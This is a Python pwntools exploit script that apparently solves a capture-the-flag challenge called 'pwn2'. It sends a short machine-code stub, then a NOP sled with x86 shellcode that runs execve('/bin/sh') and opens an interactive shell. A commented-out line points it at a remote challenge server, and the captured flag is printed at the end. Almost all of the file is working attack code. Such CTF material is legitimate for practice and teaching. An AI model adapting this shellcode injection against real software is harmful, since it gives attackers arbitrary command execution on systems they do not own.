#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

# nc 120.27.130.77 9000


pr = process('./pwn2') 
# pr = remote('120.27.130.77', 9000)

# 0:    c6 04 24 d2              mov    BYTE PTR [esp], 0xd2
# 4:    c3                       ret
pr.sendline("c60424d2c3".decode('hex'))

# execve ("/bin/sh") 
# xor ecx, ecx
# mul ecx
# push ecx
# push 0x68732f2f   ;; hs//
# push 0x6e69622f   ;; nib/
# mov ebx, esp
# mov al, 11
# int 0x80

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

nop = chr(90)  # nop
pr.sendline(nop*5+shellcode+nop*(0x1000-len(shellcode)-6))
pr.interactive()

# CCTF{i_l0ve_you_f0r_ever}
